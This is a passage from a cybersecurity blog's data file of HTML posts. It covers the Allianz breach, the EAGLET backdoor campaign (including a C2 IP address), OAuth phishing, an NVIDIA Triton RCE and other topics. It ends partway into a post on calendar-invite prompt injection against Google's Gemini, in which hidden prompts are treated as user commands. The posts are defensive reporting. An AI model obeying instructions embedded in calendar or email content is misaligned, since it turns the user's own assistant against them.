        <li>⚖️ <strong>Regulatory Scrutiny:</strong> Allianz is under review by the U.S. Federal Trade Commission (FTC) and several state-level data protection authorities.</li>
        <li>📉 <strong>Reputational Fallout:</strong> Initial reports caused a 2.3% drop in parent company Allianz SE’s stock within 24 hours.</li>
        <li>💬 <strong>Customer Distrust:</strong> Policyholders expressed concern over the safety of their data, leading to increased service cancellation requests.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>✅ What You Can Do</h3><br>
      <ul>
        <li>🔐 <strong>Zero Trust Vendor Access:</strong> Treat all third-party platforms as high-risk entry points; restrict privileges accordingly.</li>
        <li>📚 <strong>Train Your Teams:</strong> Conduct continuous simulation-based social engineering training (phishing, vishing, impersonation drills).</li>
        <li>🧩 <strong>Review API Connections:</strong> Audit CRM and SaaS tool integrations regularly for excessive or outdated permissions.</li>
        <li>🛑 <strong>Monitor Lateral Movement:</strong> Deploy user behavior analytics (UBA) to detect unusual data access across vendors.</li>
        <li>📑 <strong>Vendor SLAs:</strong> Establish breach notification, response time, and compliance clauses in all vendor contracts.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3>🚨 Why This Matters</h3><br>
      <p>This breach proves that even the most trusted institutions are vulnerable—not because of a lack of investment in cybersecurity, but because of <strong>unmonitored vendor pipelines and human error</strong>.</p>
      <p>As the insurance industry becomes increasingly digitized, its attack surface grows. <strong>Security strategies must now extend beyond the firewall</strong>, incorporating third-party ecosystems, workforce behavior, and supply chain transparency.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">"An attacker doesn’t need to breach your servers — they just need to fool someone who can."</blockquote>
      <p>Cybersecurity is no longer just a technical concern — it’s a <strong>trust issue</strong>. The Allianz breach offers a harsh lesson in vigilance: <em>you’re only as strong as your weakest link</em>.</p>
      <p>Make third-party security a boardroom-level priority today — because tomorrow’s breach might start with someone else’s mistake.</p>
    </section>
  </div>
`},{id:"cargo-talon-eaglet-cyber-espionage-russia-july-2025",title:"🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace Sector",date:"2025-07-29",author:"EthicalByte",summary:"A sophisticated cyber‑espionage campaign dubbed Operation CargoTalon used the EAGLET backdoor to infiltrate Russian aerospace organizations, marking a major escalation in state-linked hacking activity.",tags:["Cyber Espionage","EAGLET","Russian Aerospace","Operation CargoTalon","UNG0901","InfoSec"],imageKey:"cargoTalonBanner",content:`
  <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e2e8f0;font-size:15px;line-height:1.6;color:#1e293b;">

    <div style="text-align:center;margin-bottom:20px">
      <h2 style="color:#1e293b;">🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace</h2><br>
      <p><i>Published: July 25, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3 style="color:#1e293b;">🔍 What Happened?</h3><br>
      <p>Cybersecurity researchers uncovered a stealthy operation—<strong>Operation CargoTalon</strong>—that delivered a sophisticated backdoor named <strong>EAGLET</strong> to compromise Russian aerospace and defense firms. The threat actor behind this is tracked as <strong>UNG0901</strong>.</p>
      <p>The group relied on phishing lures using transport and logistics themes, tricking users into downloading ZIP files containing Windows shortcut (.lnk) files. These launched PowerShell scripts that executed a fake document and installed EAGLET in the background.</p>
    </section>

    <section style="margin-top:20px;background:#fffbea;padding:16px;border-radius:10px;">
      <h3 style="color:#92400e;">🛠️ Attack Mechanics</h3><br>
      <ul>
        <li>📎 ZIP Archive includes transport-themed filenames like <em>“TTN‑Reference‑Sheet.zip”</em></li>
        <li>🔗 LNK file silently runs PowerShell, deploying a decoy Excel file</li>
        <li>🧬 Injects the <strong>EAGLET</strong> backdoor DLL with shell command and file access capability</li>
        <li>🌐 Connects to C2 IP: <code>185.225.17.104</code></li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3 style="color:#1e293b;">📊 Why It Matters</h3><br>
      <ul>
        <li>🚨 <strong>Target:</strong> High-value defense and aerospace networks</li>
        <li>🛡️ <strong>Strategic Espionage:</strong> Long-term persistence possible using DLL sideloading</li>
        <li>🎭 <strong>Disguise:</strong> Using business documents increases phishing success rate</li>
      </ul>
      <p>This campaign highlights how cyber‑espionage no longer requires zero-days when attackers exploit human behavior and predictable file structures.</p>
    </section>

    <section style="margin-top:20px;background:#ecfdf5;padding:16px;border-radius:10px;">
      <h3 style="color:#047857;">✅ How to Defend</h3><br>
      <ul>
        <li>📧 Run phishing simulations with document-based bait</li>
        <li>🔎 Alert on PowerShell running via Explorer shortcuts</li>
        <li>🔐 Monitor traffic to suspicious C2 infrastructure</li>
        <li>📚 Train all employees—not just IT—on threat vector recognition</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e0f2fe;padding:16px;border-radius:10px;">
      <h3 style="color:#0369a1;">🌐 Broader Implications</h3><br>
      <p>Operations like CargoTalon are increasing in frequency, often linked to nation-state actors. Russian, Chinese, North Korean, and other aligned APTs are shifting from destructive malware to <strong>targeted exfiltration and silent persistence</strong>.</p>
      <p>UNG0901’s methods align with other reported campaigns in the Asia‑Europe corridor. The inclusion of multiple decoy documents also points to multi-sector targeting across transport, defense, and policy organizations.</p>
    </section>

    <section style="margin-top:20px;">
      <h3 style="color:#1e293b;">📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #0369a1;padding-left:12px;">"CargoTalon shows us that even logistics paperwork can be weaponized—reminding us that digital warfare thrives on everyday trust."</blockquote>
      <p>The takeaway? A ZIP file with a familiar name might be the launchpad for state-level intrusion. The key to stopping it is layered defense, proactive awareness, and training that treats every file like a possible threat.</p>
    </section>

    
  </div>
`},{id:"vastav-ai-deepfake-detection-july-2025",title:"🎯 Vastav AI: India’s Real-Time Deepfake Defense System",date:"2025-07-30",author:"EthicalByte",summary:"Vastav AI, India’s first indigenous real-time deepfake detection system developed by Zero Defend Security, is transforming how we combat misinformation by offering 99% accuracy across images, audio, and video.",tags:["Deepfake Detection","AI in Cybersecurity","Zero Defend Security","Misinformation","India Cybersecurity"],imageKey:"vastavAIDeepfakeBanner",content:`
  <div style="background-color:#f9fafb;padding:24px;border-radius:12px;border:1px solid #e5e7eb;">

    <div style="text-align:center;">
      <h3 style="color:#111827;">🧠 Vastav AI: India’s Real-Time Deepfake Defense System</h3><br>
      <p style="font-style:italic;color:#6b7280;">Where truth meets technology — Vastav AI takes on the era of misinformation with real-time precision.</p>
    </div>

    <section style="margin-top:24px;">
      <h4 style="color:#b91c1c;">📢 What Happened?</h4><br>
      <p>In 2025, <strong>Zero Defend Security</strong> introduced <strong>Vastav AI</strong> — India’s first AI-powered deepfake detection system built for real-time authenticity analysis of images, videos, and audio. With fake media spiraling out of control, Vastav promises up to 99% accuracy using advanced neural networks.</p>
      <p>This innovation responds directly to the rise of manipulated media in politics, social engineering, cybercrime, and misinformation warfare.</p>
    </section>

    <section style="margin-top:24px;background:#fef3c7;padding:20px;border-radius:8px;">
      <h4 style="color:#92400e;">🧪 Technical Breakdown</h4><br>
      <ul>
        <li>🤖 <strong>AI Core:</strong> Built on large transformer-based neural networks for deep media pattern recognition.</li>
        <li>🧠 <strong>Cross-Modality Detection:</strong> Works across multiple formats — audio, video, and image frames.</li>
        <li>🚀 <strong>Low Latency:</strong> Offers real-time predictions ideal for broadcast, legal, and field use.</li>
        <li>🔌 <strong>Public APIs:</strong> Integrates easily with journalistic platforms, social media checkers, and law enforcement dashboards.</li>
      </ul>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#1d4ed8;">📈 Real-World Applications</h4><br>
      <ul>
        <li>📰 <strong>News Verification:</strong> Major TV channels and media use Vastav to validate viral clips before airing.</li>
        <li>👮 <strong>Police Evidence Vetting:</strong> Used in cybercrime units to assess authenticity of video proof.</li>
        <li>🎓 <strong>Research & Academia:</strong> Supports detection of synthetic interviews or altered documentation in thesis defenses.</li>
        <li>🗳️ <strong>Election Monitoring:</strong> Helps EC & monitoring bodies during elections to counter propaganda videos.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#e0f2fe;padding:20px;border-radius:8px;">
      <h4 style="color:#0c4a6e;">🚧 Challenges Ahead</h4><br>
      <ul>
        <li>📊 <strong>Dataset Bias:</strong> Indian languages and regional content require more diverse training data.</li>
        <li>📉 <strong>False Flags:</strong> Occasional over-corrections could flag authentic videos, risking trust.</li>
        <li>🧠 <strong>Arms Race:</strong> Deepfake models like Sora or StyleGAN evolve rapidly — Vastav must adapt faster.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#ecfdf5;padding:20px;border-radius:8px;">
      <h4 style="color:#065f46;">🔍 Why This Matters</h4><br>
      <p>Vastav AI symbolizes India’s entrance into the elite club of real-time cybersecurity defense technology. With global conflicts, political disruption, and misinformation pandemics on the rise — tools like Vastav offer a digital shield for truth, reputation, and democracy.</p>
      <p>It isn’t just a tool — it’s a **strategic cybersecurity asset** born out of India’s growing AI capabilities.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#7c3aed;">💬 Industry Response</h4><br>
      <ul>
        <li>🔎 <strong>Cybersecurity Analysts:</strong> Calling it the “Indian version of Reality Defender.”</li>
        <li>📢 <strong>Journalists:</strong> Applaud its potential in fighting misinformation in rural and low-tech areas.</li>
        <li>🎯 <strong>Lawmakers:</strong> Encouraging regulation that includes Vastav-style checks on social media uploads.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#f3f4f6;padding:20px;border-radius:8px;">
      <h4 style="color:#111827;">🌐 The Global Lens</h4><br>
      <p>While global firms like Microsoft and Reality Defender dominate AI deepfake detection, Vastav is among the first real-time native systems purpose-built for India’s sociopolitical context. Its independence from western platforms ensures privacy, regional understanding, and sovereign scalability.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#4b5563;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #6366f1;padding-left:12px;">"In a world where truth is constantly distorted, Vastav AI is not just a defense mechanism — it’s a digital compass."</blockquote>
      <p>As India enters its AI decade, the launch of Vastav AI marks a new phase in securing digital truth. This 50th blog post celebrates not just a product but a national milestone — where cyber defense meets innovation, ethics, and urgency.</p>
    </section>

  </div>
`},{id:"quantum-bitcoin-resurrection-july-2025",title:"🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?",date:"2025-07-31",author:"EthicalByte",summary:"Quantum computers could soon unlock access to long-lost or dormant Bitcoin wallets by breaking the cryptography behind them. While it might sound like science fiction, the threat is real—and approaching faster than we think.",tags:["Quantum Computing","Bitcoin","ECDSA","Cryptography","Cybersecurity","Post-Quantum Security"],imageKey:"quantumBitcoinBanner",content:`
  <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?</h3><br>
      <p style="font-style:italic;">If quantum computers evolve faster than crypto standards, trillions in digital value could be cracked open.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#6a1b9a;">🌐 What’s the Big Idea?</h4><br>
      <p>Quantum computing poses a unique risk to digital assets like Bitcoin. These machines don’t just compute faster—they operate on a different mathematical paradigm. The <strong>Elliptic Curve Digital Signature Algorithm (ECDSA)</strong>—which secures Bitcoin’s private keys—was never built with quantum resistance in mind.</p>
      <p>This means a powerful enough quantum computer could <strong>derive a private key from a public Bitcoin address</strong>, especially if the public key has already been revealed through a previous transaction.</p>
    </section>

    <section style="margin-top:20px;background:#f3e5f5;padding:15px;border-radius:8px;">
      <h4 style="color:#4a148c;">💻 Technical Breakdown</h4><br>
      <ul>
        <li>🔐 <strong>ECDSA Vulnerability:</strong> Based on the difficulty of solving discrete logarithm problems — something classical computers struggle with, but quantum computers could crack with Shor’s Algorithm.</li>
        <li>⚛️ <strong>Shor’s Algorithm:</strong> Designed to factor large primes and solve problems underpinning public key cryptography—effectively reducing ECDSA’s complexity from “infeasible” to “solvable.”</li>
        <li>🧠 <strong>Quantum Readiness:</strong> Bitcoin addresses are safe until their public key is exposed (usually during outgoing transactions). After that, they become vulnerable.</li>
        <li>🧱 <strong>Blockchain Permanence:</strong> Once public keys are on the blockchain, they’re available forever — meaning they could be targeted years or decades later.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#00796b;">📉 What’s at Risk?</h4><br>
      <ul>
        <li>🪙 <strong>Lost Wallets:</strong> Over <strong>4 million Bitcoins</strong> (worth billions) are believed to be lost. Quantum breakthroughs could resurrect these—possibly into the wrong hands.</li>
        <li>👤 <strong>Early Users:</strong> Early adopters who used simple or reused keys are more at risk, especially if they’ve exposed public keys in past transactions.</li>
        <li>🏦 <strong>Exchanges & Custodians:</strong> Platforms holding crypto on behalf of clients must move fast to adopt post-quantum standards—or face systemic risk.</li>
        <li>📉 <strong>Market Panic:</strong> Even the rumor of a working quantum attack could shake global confidence and cause massive sell-offs.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d7ffd9;padding:15px;border-radius:8px;">
      <h4 style="color:#1b5e20;">🛡️ What Can We Do Today?</h4><br>
      <ul>
        <li>✅ <strong>Upgrade Wallets:</strong> Start using quantum-resistant or multi-signature wallets where possible.</li>
        <li>✅ <strong>Post-Quantum Research:</strong> Follow progress from <a href="https://csrc.nist.gov/projects/post-quantum-cryptography" target="_blank">NIST’s PQC initiative</a> which is finalizing algorithms immune to quantum attacks.</li>
        <li>✅ <strong>Network Vigilance:</strong> Developers and miners should begin discussions on quantum-safe forks and transitions for vulnerable coins.</li>
        <li>✅ <strong>Minimize Public Exposure:</strong> Refrain from reusing addresses and only reveal public keys when necessary.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#fffde7;padding:15px;border-radius:8px;">
      <h4 style="color:#f9a825;">📚 Did You Know?</h4><br>
      <ul>
        <li>📡 Google’s 2019 quantum supremacy experiment solved a problem in 200 seconds that would take supercomputers 10,000 years.</li>
        <li>🧩 Ethereum has similar cryptographic weaknesses — and Vitalik Buterin has publicly spoken about quantum concerns.</li>
        <li>🌍 Governments and intelligence agencies are already <strong>harvesting encrypted data</strong> today to decrypt later with quantum tools—a strategy known as “store now, decrypt later.”</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e3f2fd;padding:15px;border-radius:8px;">
      <h4 style="color:#1565c0;">🔭 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #1565c0;padding-left:10px;">"Quantum computing could be both the grave robber and the guardian of crypto."</blockquote>
      <p>Quantum threats to Bitcoin aren’t here yet — but they’re coming. Whether it’s by choice or by breach, the ecosystem must evolve. From the Bitcoin core dev team to casual holders, <strong>post-quantum migration plans must begin now</strong>.</p>
      <p>In a digital age where <strong>mathematics = trust</strong>, we must prepare for the moment when math itself gets upgraded.</p>
    </section>

  </div>
`},{id:"nigeria-ai-cybersecurity-gap-july-2025",title:"🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos",date:"2025-08-01",author:"EthicalByte",summary:"Sophos executive Prish Thaakar emphasizes how Nigerian organizations can leverage AI and machine learning to detect threats faster, reduce data breaches, and build resilience against evolving cyberattacks.",tags:["Nigeria","AI Security","Sophos","Cybersecurity Strategy","Prish Thaakar"],imageKey:"nigeriaAICybersecurityBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos</h3><br>
      <p style="font-style:italic;">Artificial Intelligence could become Nigeria’s frontline defense against digital threats.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">📢 What Happened?</h4><br>
      <p>According to <strong>Prish Thaakar</strong>, a senior executive at Sophos, Nigeria’s current cybersecurity posture can be significantly strengthened through AI-powered solutions.</p>
      <p>In an interview with Vanguard, he outlined how machine learning and automation could help Nigerian firms detect and respond to sophisticated threats in real time — reducing response time, cost, and human error.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🧠 Why AI Is a Game-Changer</h4><br>
      <ul>
        <li>🚨 <strong>Threat Prediction:</strong> AI models can anticipate attack patterns before they strike.</li>
        <li>⚙️ <strong>Automated Response:</strong> Machine learning can flag anomalies and trigger rapid responses without human delay.</li>
        <li>🔍 <strong>Data-Driven Insights:</strong> Organizations gain deeper understanding of attack surfaces and weak points.</li>
        <li>🔐 <strong>Scalability:</strong> Even small businesses can deploy AI tools to protect digital assets affordably.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">🌍 Nigeria’s Cybersecurity Landscape</h4><br>
      <p>Nigeria, like many developing nations, has faced rising incidents of ransomware, phishing, and insider attacks. A large digital population, coupled with under-resourced IT teams, has made the country vulnerable.</p>
      <p>By adopting AI tools from vendors like Sophos, Nigerian institutions could close detection gaps, protect customer data, and comply with national digital safety policies.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">✅ What Needs to Happen</h4><br>
      <ul>
        <li>💡 <strong>Upskilling:</strong> Encourage cybersecurity training to maximize AI tool usage.</li>
        <li>🔗 <strong>Public-Private Collaboration:</strong> Gov & private sectors must jointly invest in AI readiness.</li>
        <li>📊 <strong>Adoption of Threat Intelligence:</strong> Shareable, AI-enhanced threat feeds can increase collective resilience.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a connected world, cybersecurity is no longer optional — and AI is no longer futuristic.”</blockquote>
      <p>Prish Thaakar’s insights serve as a wake-up call for Nigeria’s cybersecurity industry. Strategic AI deployment could transform vulnerability into strength, and create a secure digital future for West Africa’s tech hub.</p>
    </section>

  </div>
`},{id:"microsoft-oauth-tycoon-phishing-august-2025",title:"🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached",date:"2025-08-02",author:"EthicalByte",summary:"A stealthy phishing campaign using fake Microsoft OAuth apps and the Tycoon kit has compromised thousands of Microsoft 365 accounts. It bypasses MFA and mimics over 50 known brands. This operation is a masterclass in modern-day identity hijacking.",tags:["OAuth","Phishing","Microsoft 365","Tycoon Kit","Cybersecurity","Adversary-in-the-middle"],imageKey:"microsoftOauthTycoonAttack",content:`
  <div style="background-color:#fbfbfb;padding:20px;border-radius:12px;border:1px solid #e0e0e0;">

    <div style="text-align:center;">
      <h3 style="color:#1a1a1a;">🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached</h3><br>
      <p style="font-style:italic;color:#666;">A phishing campaign so advanced, it didn’t need passwords.</p>
    </div>

    <p>
      A highly coordinated phishing operation has exploited fake Microsoft OAuth apps combined with the Tycoon phishing kit, breaching over <strong>3,000 users across 900 organizations</strong>. 
      The attackers bypassed Multi-Factor Authentication (MFA) using adversary-in-the-middle (AiTM) infrastructure and tricked victims into authorizing malicious applications — all while maintaining long-term access to cloud data.
    </p>

    <p>
      Victims clicked on phishing emails that led them to spoofed Microsoft login pages. These pages were actually AiTM proxies that intercepted credentials and authentication tokens. 
      From there, users were prompted to grant OAuth permissions to fake apps cleverly disguised as Microsoft Teams, Adobe, SharePoint, or DocuSign integrations.
    </p>

    <p>
      Once the permissions were granted, the attackers didn’t need usernames or passwords anymore. They could access emails, calendars, OneDrive files, and Teams messages — all through OAuth token access. 
      The Tycoon phishing kit automated much of the infrastructure, handling session hijacking, brand spoofing, and token persistence in a seamless flow.
    </p>

    <p>
      Microsoft confirmed that these fake apps were hosted in legitimate cloud environments and even passed basic domain verification. Because they abused the OAuth consent model, victims didn’t realize anything had gone wrong.
    </p>

    <div style="background:#fff3cd;padding:15px;border-radius:8px;margin-top:20px;border:1px solid #ffecb5;">
      <p><strong>Highlights:</strong><br>
      • 3,000+ users affected across 900+ companies<br>
      • 50+ spoofed app brands used to lure victims<br>
      • MFA bypassed with adversary-in-the-middle proxies<br>
      • Access granted via consent to fake OAuth apps<br>
      • Attackers used token refresh mechanisms to maintain persistence<br>
      </p>
    </div>

    <p style="margin-top:20px;">
      This is a critical lesson for defenders: Cloud security is not just about strong passwords or even MFA anymore. It’s about understanding how OAuth scopes and token lifetimes work, auditing what applications users are authorizing, and restricting third-party app access by default.
    </p>

    <p>
      Organizations are advised to review tenant-wide OAuth policies, restrict user consent, and regularly scan for anomalous cloud app activity. User education around fake app consent requests is now as vital as phishing awareness itself.
    </p>

    <p style="margin-top:20px;">
      This campaign is one of the most sophisticated examples of phishing-as-a-service we’ve seen in 2025 — stealthy, brand-polished, and identity-focused. It proves one thing: attackers no longer just want your credentials. They want your trust.
    </p>

  </div>
`},{id:"network-security-digital-era-august-2025",title:"🛡️ Network Security in the Digital Era: Safeguarding the Digital World",date:"2025-08-04",author:"EthicalByte",summary:"In an interconnected world, effective network security demands a multi-layered approach—from firewalls and IDS to training and incident planning. This blog explores what it takes to stay secure in 2025 and beyond.",tags:["Network Security","Cybersecurity Strategies","Digital Infrastructure","Encryption","Firewall","IDS"],imageKey:"networkSecurityDigitalEraBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
    
    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🛡️ Network Security in the Digital Era: Safeguarding the Digital World</h3><br>
      <p style="font-style:italic;">A secure network is no longer optional—it's the foundation of digital resilience.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">🌐 The Modern Threat Landscape</h4><br>
      <p>From ransomware attacks to nation-state espionage, today’s digital environment demands a proactive and robust network defense strategy. The increasing complexity of infrastructure and cloud integration introduces more attack vectors than ever before.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🔐 Building Stronger Defenses</h4><br>
      <ul>
        <li>🧱 <strong>Firewalls:</strong> Your first line of defense against unauthorized access.</li>
        <li>🕵️‍♂️ <strong>Intrusion Detection Systems (IDS):</strong> Real-time detection of suspicious activity.</li>
        <li>🔒 <strong>Encryption:</strong> End-to-end data protection during transmission and at rest.</li>
        <li>🛠️ <strong>Regular Software Updates:</strong> Patch known vulnerabilities before attackers do.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">👨‍🏫 Human Element in Cybersecurity</h4><br>
      <p>Technology alone isn’t enough. Employees are often the weakest link in the security chain. Consistent training on phishing awareness, password hygiene, and secure practices is critical to building a cyber-aware workforce.</p>
    </section>

    <section style="margin-top:20px;background:#f0f0f0;padding:15px;border-radius:8px;">
      <h4 style="color:#2a2a2a;">📦 Incident Response & Resilience</h4><br>
      <p>When prevention fails, response speed matters. An effective incident response plan minimizes damage, ensures regulatory compliance, and restores operations efficiently. Testing and updating the plan regularly is non-negotiable.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">🚀 Future-Proofing Security</h4><br>
      <ul>
        <li>🧠 Integrate AI/ML for anomaly detection.</li>
        <li>⚙️ Automate routine threat analysis.</li>
        <li>📡 Secure IoT devices and remote endpoints.</li>
        <li>📊 Conduct regular audits and penetration testing.</li>
      </ul>
      <p>As cyberattacks grow in sophistication, adapting and upgrading your defenses is critical for long-term resilience.</p>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">💡 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Cybersecurity is a journey, not a destination. Stay aware. Stay updated. Stay secure.”</blockquote>
      <p>Whether you're protecting a small business or managing national infrastructure, effective network security is the backbone of trust in a digital world. The threats are real—but so are the solutions.</p>
    </section>

  </div>
`},{id:"nvidia-triton-ai-rce-2025",title:"NVIDIA Triton AI Servers Can Be Hijacked — No Login Needed",date:"2025-08-05",author:"EthicalByte",summary:"New critical vulnerabilities in NVIDIA's Triton Inference Server expose AI infrastructure to unauthenticated remote code execution. Researchers warn it could lead to full model theft and unauthorized control.",tags:["NVIDIA","Triton","AI Security","Remote Code Execution","Model Theft","Unauthenticated Access"],imageKey:"nvidiaTritonExploit",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#c53030;">🚨 <br> Critical RCE Vulnerability in NVIDIA Triton AI Servers</h3><br>
      <h3>🧠 What Happened?</h3><br>
      <ul>
        <li>🚀 Researchers discovered a <strong>chain of vulnerabilities</strong> in <strong>NVIDIA’s Triton Inference Server</strong>.</li>
        <li>💥 Exploitation leads to <strong>unauthenticated remote code execution (RCE)</strong>.</li>
        <li>🎯 Attackers can fully hijack servers, steal AI models, manipulate predictions, or implant malware.</li>
        <li>🛠 The exploit starts with a <strong>single malformed HTTP request</strong> that bypasses authentication checks.</li>
      </ul>

      <h3>🔍 Why It Matters</h3><br>
      <p>NVIDIA Triton is widely used in AI production environments — including cloud AI workloads, model inference APIs, and internal ML Ops pipelines. A breach here could compromise:</p>
      <ul>
        <li>📊 Proprietary AI models & training data</li>
        <li>🔓 Intellectual property and competitive strategies</li>
        <li>🧠 Real-time inference results (autonomous driving, finance, etc.)</li>
      </ul>

      <h3>📌 Technical Overview</h3><br>
      <ul>
        <li>🧱 Vulnerabilities are related to insecure default settings and improper input sanitization in the model control APIs.</li>
        <li>🌐 No login or API key needed in certain misconfigured environments — opens up direct access to attackers.</li>
        <li>⚠ Unpatched Triton servers are a serious security risk in shared compute clusters and cloud workloads.</li>
      </ul>

      <h3>🛡 Recommendations</h3><br>
      <ul>
        <li>📥 Immediately update to the latest patched Triton release.</li>
        <li>🔐 Enforce strict authentication and tokenized API access.</li>
        <li>📉 Disable unused endpoints and monitor for anomalous inference requests.</li>
        <li>🛑 Limit external exposure of Triton instances and apply network segmentation.</li>
      </ul>

      <h3>📢 Final Thoughts</h3><br>
      <p>This is another stark reminder that <strong>AI infrastructure is a prime cyber target</strong>. As ML models become central to business and innovation, securing inference endpoints is no longer optional — it’s mission-critical.</p>

      <blockquote style="border-left:4px solid #c53030;padding-left:1em;margin-top:1em;">
        One malformed packet — and your AI is under enemy control.
      </blockquote>
    </div>
  `},{id:"generative-ai-cybersecurity-role",title:"The Role of Generative AI in Cybersecurity",date:"2025-08-06",author:"EthicalByte",summary:"Generative AI isn’t just for content—it’s changing cybersecurity too. From simulating attacks to anomaly detection, learn how AI is transforming defenses.",tags:["Generative AI","Cybersecurity","AI Security","Threat Detection","Cyber Defense"],imageKey:"generativeAICyberBanner",content:`
    <div style="background:linear-gradient(135deg,#e0e7ff,#f0fdf4);padding:1.5em;border-radius:12px;color:#111;">
      <h3>🧠 The Role of Generative AI in Cybersecurity</h3><br>
      
      <p>Generative AI has moved far beyond art tools and chat assistants—it's now playing a critical role in shaping how we <strong>defend against cyber threats</strong>. As digital threats grow more sophisticated, defenders are turning to AI to keep pace.</p>
      
      <h3>🔍 What Can Generative AI Do?</h3><br>
      <ul>
        <li>🛠 <strong>Simulate Cyberattacks:</strong> Generative AI can mimic real-world cyberattacks to test your systems, making red teaming and penetration testing faster and more realistic.</li>
        <li>📈 <strong>Detect Anomalies:</strong> By analyzing system logs and traffic patterns, it can highlight suspicious behavior that traditional systems might miss.</li>
        <li>🔄 <strong>Automated Threat Modeling:</strong> AI systems can generate evolving attack scenarios that adapt to real-time defenses.</li>
        <li>🔐 <strong>Enhance Zero Trust Architecture:</strong> AI helps verify access continuously by understanding user behavior profiles.</li>
      </ul>

      <h3>🚨 Why It Matters</h3><br>
      <p>Attackers are already experimenting with AI for phishing, deepfakes, and malware. We need to meet fire with fire. Generative AI gives defenders a way to:</p>
      <ul>
        <li>🛡 Proactively identify vulnerabilities</li>
        <li>⚡ Respond faster to threats</li>
        <li>📊 Visualize complex threat data intuitively</li>
      </ul>

      <h3>🎯 Get 1% Better at Cybersecurity Today</h3><br>
      <p>Learning never stops in this field. If you're serious about stepping up your game in cybersecurity</p>
     

      <h3>📌 Final Thoughts</h3><br>
      <p>Generative AI is a double-edged sword. But in the right hands, it can become a powerful tool for protecting networks, systems, and data. The future of cybersecurity will be human + AI—working side by side to outsmart evolving threats.</p>

      <blockquote style="border-left:4px solid #2563eb;padding-left:1em;margin-top:1em;">
        ⚡ Stay ahead. Learn fast. Defend smart.
      </blockquote>
    </div>
  `},{id:"gemini-calendar-exploit-2025",title:"Gemini Exploited via Weaponized Calendar Invites",subtitle:"Google’s AI Assistant Abused to Steal Emails and Control Devices",date:"2025-08-08",author:"EthicalByte",summary:"calendar invites, hidden prompts, smart-home hijacks, high-risk Promptware, now patched.",tags:["AI Security","Prompt Injection","Google Gemini","Cyber Attacks","2025"],imageKey:"geminicalendarexploitbanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#212529;">🛡️ Gemini Exploited via Weaponized Calendar Invites</h3><br>
        <p style="font-style:italic;">Google’s AI Assistant Abused to Steal Emails and Control Devices</p>
      </div>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">🧠 What Happened</h3><br>
        <p>A newly discovered vulnerability chain targets Google's Gemini AI assistant via malicious calendar invites and weaponized email prompts. These indirect prompt injections are part of a growing trend called <strong>Targeted Promptware Attacks</strong>.</p>
        <p>The attacker embeds harmful prompts inside calendar event descriptions or email content. When Gemini processes these, it treats them as user instructions — bypassing user intent and executing unintended commands.</p>
      </section>

